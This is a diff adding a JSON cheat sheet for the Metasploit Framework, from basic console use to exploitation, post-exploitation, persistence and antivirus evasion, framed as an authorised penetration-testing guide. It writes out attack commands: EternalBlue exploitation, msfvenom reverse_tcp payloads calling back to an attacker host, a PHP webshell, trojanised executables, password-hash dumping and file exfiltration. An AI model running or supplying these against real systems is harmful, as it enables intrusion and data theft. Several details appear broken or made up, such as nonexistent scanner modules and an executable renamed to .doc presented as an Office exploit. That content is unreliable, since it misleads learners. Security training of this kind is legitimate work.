@@ -1,0 +1,614 @@
+{
+	"title": "Metasploit Framework",
+	"description": "A comprehensive guide to using the Metasploit Framework for penetration testing, from novice to advanced levels. Covers fundamentals, information gathering, vulnerability scanning, exploit development, post-exploitation, scripting, and more. Includes commands, modules, and best practices. Use only on systems you own or are authorized to test.",
+	"language": "ruby",
+	"categories": [
+		{
+			"title": "Metasploit Fundamentals",
+			"description": "Core concepts, installation, and basic usage for beginners.",
+			"items": [
+				{
+					"title": "What is Metasploit?",
+					"description": "Overview of the framework and its components.",
+					"table": {
+						"headers": ["Component", "Description"],
+						"rows": [
+							["Framework", "Ruby-based penetration testing tool"],
+							["Modules", "Exploits, payloads, auxiliaries, post modules"],
+							["Console", "msfconsole - main interface"],
+							["Database", "Stores hosts, services, vulnerabilities"]
+						]
+					},
+					"example": "# Start MSF: msfconsole\n# Help: help\n# Exit: exit"
+				},
+				{
+					"title": "Installation and Setup",
+					"description": "Installing Metasploit on different systems.",
+					"table": {
+						"headers": ["OS", "Command"],
+						"rows": [
+							["Kali Linux", "apt update && apt install metasploit-framework"],
+							["Ubuntu", "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall"],
+							["macOS", "brew install metasploit"],
+							["Windows", "Download from rapid7.com"]
+						]
+					},
+					"example": "# Update MSF: msfupdate\n# Start database: db_status\n# If not running: systemctl start postgresql && msfdb init"
+				},
+				{
+					"title": "Basic Commands",
+					"description": "Essential commands for navigating MSF.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["msfconsole", "Start the Metasploit console"],
+							["use [module]", "Select a module"],
+							["show options", "Display module options"],
+							["set [option] [value]", "Set an option"],
+							["run/exploit", "Execute the module"],
+							["back", "Go back to main menu"],
+							["search [term]", "Search for modules"]
+						]
+					},
+					"example": "msf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > show options\nmsf6 > set RHOSTS 192.168.1.100\nmsf6 > exploit"
+				},
+				{
+					"title": "Database Management",
+					"description": "Using the MSF database for storing data.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["db_status", "Check database status"],
+							["db_connect", "Connect to database"],
+							["hosts", "List discovered hosts"],
+							["services", "List services"],
+							["vulns", "List vulnerabilities"],
+							["workspace", "Manage workspaces"]
+						]
+					},
+					"example": "# Create workspace: workspace -a myproject\n# Import Nmap: db_import /path/to/nmap.xml\n# List hosts: hosts"
+				}
+			]
+		},
+		{
+			"title": "Information Gathering",
+			"description": "Passive and active reconnaissance using MSF modules.",
+			"items": [
+				{
+					"title": "Passive Information Gathering",
+					"description": "Gather info without direct interaction.",
+					"table": {
+						"headers": ["Module", "Purpose"],
+						"rows": [
+							["auxiliary/scanner/http/http_version", "Check HTTP version"],
+							["auxiliary/scanner/http/dir_scanner", "Directory scanning"],
+							["auxiliary/gather/dns_info", "DNS enumeration"],
+							["auxiliary/gather/search_email_collector", "Email harvesting"]
+						]
+					},
+					"example": "use auxiliary/scanner/http/http_version\nset RHOSTS 192.168.1.0/24\nrun"
+				},
+				{
+					"title": "Active Scanning",
+					"description": "Direct scanning for hosts and services.",
+					"table": {
+						"headers": ["Module", "Purpose"],
+						"rows": [
+							["auxiliary/scanner/discovery/arp_sweep", "ARP discovery"],
+							["auxiliary/scanner/portscan/tcp", "TCP port scan"],
+							["auxiliary/scanner/smb/smb_version", "SMB version check"],
+							["auxiliary/scanner/ssh/ssh_version", "SSH version"]
+						]
+					},
+					"example": "use auxiliary/scanner/portscan/tcp\nset RHOSTS 192.168.1.100\nset PORTS 1-1000\nrun"
+				},
+				{
+					"title": "Nmap Integration",
+					"description": "Using Nmap with MSF.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["db_nmap [options]", "Run Nmap and import results"],
+							["nmap -sV -O [target]", "Version and OS detection"],
+							["db_import /path/to/nmap.xml", "Import Nmap XML"]
+						]
+					},
+					"example": "db_nmap -sV -O 192.168.1.100\nhosts\nservices"
+				}
+			]
+		},
+		{
+			"title": "Vulnerability Scanning",
+			"description": "Scanning for known vulnerabilities.",
+			"items": [
+				{
+					"title": "Vulnerability Scanners",
+					"description": "Modules for detecting vulnerabilities.",
+					"table": {
+						"headers": ["Module", "Target"],
+						"rows": [
+							["auxiliary/scanner/http/http_vuln_scanner", "HTTP vulnerabilities"],
+							["auxiliary/scanner/smb/smb_ms17_010", "EternalBlue check"],
+							["auxiliary/scanner/ftp/ftp_version", "FTP version"],
+							["auxiliary/scanner/ssl/openssl_heartbleed", "Heartbleed"]
+						]
+					},
+					"example": "use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS 192.168.1.100\nrun"
+				},
+				{
+					"title": "Nessus Integration",
+					"description": "Importing Nessus scans.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["db_import /path/to/nessus.nessus", "Import Nessus XML"],
+							["vulns", "List vulnerabilities"]
+						]
+					},
+					"example": "db_import scan.nessus\nvulns -p 445"
+				}
+			]
+		},
+		{
+			"title": "Writing a Simple Fuzzer",
+			"description": "Creating basic fuzzers for testing.",
+			"items": [
+				{
+					"title": "Fuzzer Basics",
+					"description": "Understanding fuzzing in MSF.",
+					"table": {
+						"headers": ["Concept", "Description"],
+						"rows": [
+							["Fuzzer", "Sends malformed data to find crashes"],
+							["Auxiliary Module", "Use auxiliary/scanner/http as base"],
+							["Payload", "Random or patterned data"],
+							["Logging", "Capture responses and errors"]
+						]
+					},
+					"example": "# Example fuzzer module\nrequire 'msf/core'\nclass MetasploitModule < Msf::Auxiliary\n  def run\n    # Fuzzing logic\n  end\nend"
+				},
+				{
+					"title": "Simple HTTP Fuzzer",
+					"description": "Basic HTTP request fuzzer.",
+					"table": {
+						"headers": ["Step", "Code"],
+						"rows": [
+							["Initialize", "connect\nfuzz_data = Rex::Text.rand_text_alpha(1000)"],
+							["Send", "send_request_raw({'data' => fuzz_data})"],
+							["Check", "if response.nil? then print_good('Crash!') end"]
+						]
+					},
+					"example": "use auxiliary/scanner/http/http_fuzzer\nset RHOSTS 192.168.1.100\nset FUZZLEN 1000\nrun"
+				}
+			]
+		},
+		{
+			"title": "Exploit Development",
+			"description": "Developing custom exploits.",
+			"items": [
+				{
+					"title": "Exploit Structure",
+					"description": "Anatomy of an MSF exploit.",
+					"table": {
+						"headers": ["Section", "Purpose"],
+						"rows": [
+							["Metadata", "Name, description, author"],
+							["Includes", "Required mixins"],
+							["Options", "User-configurable settings"],
+							["Check", "Vulnerability verification"],
+							["Exploit", "Payload delivery"]
+						]
+					},
+					"example": "class MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Sample Exploit',\n      'Description' => 'Demo',\n      'Author' => 'You'\n    ))\n  end\nend"
+				},
+				{
+					"title": "Buffer Overflow Exploit",
+					"description": "Classic buffer overflow example.",
+					"table": {
+						"headers": ["Step", "Description"],
+						"rows": [
+							["Find Offset", "Use pattern_create and pattern_offset"],
+							["Bad Chars", "Identify bad characters"],
+							["Return Address", "Find JMP ESP"],
+							["Payload", "Generate shellcode"]
+						]
+					},
+					"example": "# Generate pattern: pattern_create -l 1000\n# Find offset: pattern_offset -q <crash_value>"
+				},
+				{
+					"title": "ROP Chains",
+					"description": "Return-Oriented Programming.",
+					"table": {
+						"headers": ["Concept", "Description"],
+						"rows": [
+							["Gadgets", "Short instruction sequences"],
+							["Chain", "Sequence of gadget addresses"],
+							["Tools", "ROPgadget, mona.py"]
+						]
+					},
+					"example": "# Find gadgets: ROPgadget --binary target.exe\n# Build chain in exploit"
+				}
+			]
+		},
+		{
+			"title": "Web App Exploit Dev",
+			"description": "Developing web application exploits.",
+			"items": [
+				{
+					"title": "SQL Injection",
+					"description": "Exploiting SQLi vulnerabilities.",
+					"table": {
+						"headers": ["Module", "Description"],
+						"rows": [
+							["auxiliary/scanner/http/sql_injection", "Basic SQLi scanner"],
+							["exploit/multi/http/struts2_content_type_ognl", "Struts2 exploit"]
+						]
+					},
+					"example": "use auxiliary/scanner/http/sql_injection\nset URL http://target.com/page?id=1\nrun"
+				},
+				{
+					"title": "XSS and CSRF",
+					"description": "Client-side attacks.",
+					"table": {
+						"headers": ["Type", "Example Payload"],
+						"rows": [
+							["XSS", "<script>alert('XSS')</script>"],
+							["CSRF", "Hidden form with malicious action"]
+						]
+					},
+					"example": "# Use Burp or ZAP for testing\n# MSF: use auxiliary/scanner/http/xss_scanner"
+				},
+				{
+					"title": "File Upload Exploits",
+					"description": "Exploiting insecure file uploads.",
+					"table": {
+						"headers": ["Technique", "Description"],
+						"rows": [
+							["Extension Bypass", "Use .php.jpg"],
+							["MIME Type", "Change Content-Type"],
+							["Path Traversal", "../../../shell.php"]
+						]
+					},
+					"example": "# Use msfvenom to create webshell\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php"
+				}
+			]
+		},
+		{
+			"title": "Client Side Attacks",
+			"description": "Attacks targeting client applications.",
+			"items": [
+				{
+					"title": "Browser Exploits",
+					"description": "Exploiting browser vulnerabilities.",
+					"table": {
+						"headers": ["Module", "Target"],
+						"rows": [
+							["exploit/windows/browser/ms14_064_ole_code_execution", "IE OLE exploit"],
+							["exploit/multi/browser/java_signed_applet", "Java applet exploit"]
+						]
+					},
+					"example": "use exploit/windows/browser/ie_execcommand_uaf\nset URIPATH /\nset SRVHOST 192.168.1.50\nexploit"
+				},
+				{
+					"title": "Office Document Exploits",
+					"description": "Malicious documents.",
+					"table": {
+						"headers": ["Tool", "Description"],
+						"rows": [
+							["msfvenom", "Create malicious DOC/XLS"],
+							["exploit/windows/fileformat/ms14_060_sandworm", "Office exploit"]
+						]
+					},
+					"example": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > malicious.doc"
+				},
+				{
+					"title": "Social Engineering",
+					"description": "Phishing and baiting.",
+					"table": {
+						"headers": ["Module", "Description"],
+						"rows": [
+							["auxiliary/server/capture/http_basic", "Credential capture"],
+							["exploit/multi/browser/java_signed_applet", "Drive-by download"]
+						]
+					},
+					"example": "use auxiliary/server/capture/http_basic\nset SRVHOST 192.168.1.50\nrun"
+				}
+			]
+		},
+		{
+			"title": "MSF Post Exploitation",
+			"description": "Post-exploitation techniques.",
+			"items": [
+				{
+					"title": "Meterpreter Basics",
+					"description": "Using Meterpreter for post-exploitation.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["sysinfo", "System information"],
+							["getuid", "Current user"],
+							["shell", "Drop to system shell"],
+							["upload/download", "File transfer"],
+							["keyscan_start", "Keylogger"],
+							["screenshot", "Capture screen"]
+						]
+					},
+					"example": "meterpreter > sysinfo\nmeterpreter > getuid\nmeterpreter > shell"
+				},
+				{
+					"title": "Privilege Escalation",
+					"description": "Gaining higher privileges.",
+					"table": {
+						"headers": ["Module", "Description"],
+						"rows": [
+							["post/windows/escalate/getsystem", "Windows privilege escalation"],
+							["post/linux/escalate/sudo", "Linux sudo exploit"]
+						]
+					},
+					"example": "use post/windows/escalate/getsystem\nset SESSION 1\nrun"
+				},
+				{
+					"title": "Data Exfiltration",
+					"description": "Stealing data.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["download", "Download files"],
+							["search", "Find files"],
+							["hashdump", "Dump password hashes"]
+						]
+					},
+					"example": "meterpreter > search -f *.doc -d C:\\\nmeterpreter > download C:\\secret.doc /tmp/"
+				}
+			]
+		},
+		{
+			"title": "Meterpreter Scripting",
+			"description": "Writing scripts for Meterpreter.",
+			"items": [
+				{
+					"title": "Basic Scripting",
+					"description": "Simple Meterpreter scripts.",
+					"table": {
+						"headers": ["Script", "Purpose"],
+						"rows": [
+							["post/windows/manage/migrate", "Migrate process"],
+							["post/windows/gather/enum_logged_on_users", "List users"],
+							["post/windows/gather/hashdump", "Dump hashes"]
+						]
+					},
+					"example": "use post/windows/manage/migrate\nset SESSION 1\nset PID 1234\nrun"
+				},
+				{
+					"title": "Custom Scripts",
+					"description": "Writing your own scripts.",
+					"table": {
+						"headers": ["Step", "Description"],
+						"rows": [
+							["Framework", "Use Msf::Post module"],
+							["Methods", "session.sys, session.fs"],
+							["Run", "Execute with run_simple"]
+						]
+					},
+					"example": "class MetasploitModule < Msf::Post\n  def run\n    print_status('Custom script')\n    # Code here\n  end\nend"
+				}
+			]
+		},
+		{
+			"title": "Maintaining Access",
+			"description": "Ensuring persistent access.",
+			"items": [
+				{
+					"title": "Backdoors",
+					"description": "Installing backdoors.",
+					"table": {
+						"headers": ["Method", "Description"],
+						"rows": [
+							["Persistence", "Add to startup"],
+							["Web Shell", "Upload PHP shell"],
+							["Scheduled Task", "Cron job"]
+						]
+					},
+					"example": "use exploit/windows/local/persistence\nset SESSION 1\nrun"
+				},
+				{
+					"title": "Tunneling",
+					"description": "Creating tunnels for access.",
+					"table": {
+						"headers": ["Tool", "Description"],
+						"rows": [
+							["Meterpreter Portfwd", "portfwd add -l 8080 -p 80 -r target"],
+							["SSH Tunneling", "ssh -L 8080:target:80 proxy"]
+						]
+					},
+					"example": "meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.100"
+				}
+			]
+		},
+		{
+			"title": "MSF Extended Usage",
+			"description": "Advanced MSF features.",
+			"items": [
+				{
+					"title": "Resource Scripts",
+					"description": "Automating tasks with resource files.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["resource /path/to/script.rc", "Run resource script"],
+							["makerc /path/to/output.rc", "Create resource file"]
+						]
+					},
+					"example": "# script.rc\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.50\nexploit -j"
+				},
+				{
+					"title": "MSFvenom",
+					"description": "Payload generation.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["msfvenom -l payloads", "List payloads"],
+							["msfvenom -p [payload] -f exe > file.exe", "Generate payload"],
+							["msfvenom -x template.exe -p payload -f exe > infected.exe", "Embed in file"]
+						]
+					},
+					"example": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > payload.exe"
+				}
+			]
+		},
+		{
+			"title": "Metasploit GUIs",
+			"description": "Graphical interfaces for MSF.",
+			"items": [
+				{
+					"title": "Armitage",
+					"description": "Graphical MSF interface.",
+					"table": {
+						"headers": ["Feature", "Description"],
+						"rows": [
+							["Hosts View", "Visualize network"],
+							["Attacks Menu", "Launch exploits"],
+							["Post Exploitation", "Manage sessions"]
+						]
+					},
+					"example": "# Install: apt install armitage\n# Run: armitage"
+				},
+				{
+					"title": "Cobalt Strike",
+					"description": "Advanced GUI (commercial).",
+					"table": {
+						"headers": ["Feature", "Description"],
+						"rows": [
+							["Beacon", "Advanced payload"],
+							["Team Server", "Collaborative"],
+							["Malleable C2", "Custom profiles"]
+						]
+					},
+					"example": "# Not open-source, requires license"
+				}
+			]
+		},
+		{
+			"title": "Post Module Reference",
+			"description": "Common post-exploitation modules.",
+			"items": [
+				{
+					"title": "Windows Post Modules",
+					"description": "Windows-specific post modules.",
+					"table": {
+						"headers": ["Module", "Purpose"],
+						"rows": [
+							["post/windows/gather/enum_domain", "Domain enumeration"],
+							["post/windows/manage/enable_rdp", "Enable RDP"],
+							["post/windows/gather/hashdump", "Password hashes"]
+						]
+					},
+					"example": "use post/windows/gather/hashdump\nset SESSION 1\nrun"
+				},
+				{
+					"title": "Linux Post Modules",
+					"description": "Linux-specific post modules.",
+					"table": {
+						"headers": ["Module", "Purpose"],
+						"rows": [
+							["post/linux/gather/enum_configs", "Config files"],
+							["post/linux/manage/download_exec", "Download and exec"],
+							["post/linux/gather/enum_users_history", "User history"]
+						]
+					},
+					"example": "use post/linux/gather/enum_configs\nset SESSION 1\nrun"
+				}
+			]
+		},
+		{
+			"title": "Auxiliary Module Reference",
+			"description": "Useful auxiliary modules.",
+			"items": [
+				{
+					"title": "Scanners",
+					"description": "Scanning modules.",
+					"table": {
+						"headers": ["Module", "Purpose"],
+						"rows": [
+							["auxiliary/scanner/http/dir_scanner", "Directory brute force"],
+							["auxiliary/scanner/smb/smb_login", "SMB login brute"],
+							["auxiliary/scanner/ssh/ssh_login", "SSH login brute"]
+						]
+					},
+					"example": "use auxiliary/scanner/http/dir_scanner\nset RHOSTS 192.168.1.100\nset DICTIONARY /usr/share/wordlists/dirb/common.txt\nrun"
+				},
+				{
+					"title": "Gatherers",
+					"description": "Information gathering modules.",
+					"table": {
+						"headers": ["Module", "Purpose"],
+						"rows": [
+							["auxiliary/gather/dns_enum", "DNS enumeration"],
+							["auxiliary/gather/http_put", "HTTP PUT test"],
+							["auxiliary/gather/search_email_collector", "Email collection"]
+						]
+					},
+					"example": "use auxiliary/gather/dns_enum\nset DOMAIN example.com\nrun"
+				}
+			]
+		},
+		{
+			"title": "Advanced Topics",
+			"description": "Advanced MSF concepts and techniques.",
+			"items": [
+				{
+					"title": "Custom Modules",
+					"description": "Developing your own modules.",
+					"table": {
+						"headers": ["Type", "Location"],
+						"rows": [
+							["Exploit", "modules/exploits/"],
+							["Auxiliary", "modules/auxiliary/"],
+							["Post", "modules/post/"]
+						]
+					},
+					"example": "# Copy template: cp /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue.rb /path/to/custom.rb\n# Edit and reload: reload_all"
+				},
+				{
+					"title": "Evasion Techniques",
+					"description": "Bypassing AV and IDS.",
+					"table": {
+						"headers": ["Technique", "Description"],
+						"rows": [
+							["Encoding", "Use msfvenom encoders"],
+							["Obfuscation", "Custom payloads"],
+							["Malleable C2", "Modify C2 traffic"]
+						]
+					},
+					"example": "msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -f exe > encoded.exe"
+				},
+				{
+					"title": "Integration with Other Tools",
+					"description": "Using MSF with Nmap, Burp, etc.",
+					"table": {
+						"headers": ["Tool", "Integration"],
+						"rows": [
+							["Nmap", "db_nmap"],
+							["Burp Suite", "Proxy modules"],
+							["Wireshark", "Packet capture"]
+						]
+					},
+					"example": "# Import Burp: db_import burp.xml\n# Use Wireshark: tcpdump -i eth0 -w capture.pcap"
+				},
+				{
+					"title": "Reporting",
+					"description": "Generating reports.",
+					"table": {
+						"headers": ["Command", "Description"],
+						"rows": [
+							["db_export -f xml", "Export to XML"],
+							["db_export -f pwdump", "Export hashes"],
+							["report", "Generate HTML report"]
+						]
+					},
+					"example": "db_export -f xml /path/to/report.xml"
+				}
+			]
+		}
+	]
+}
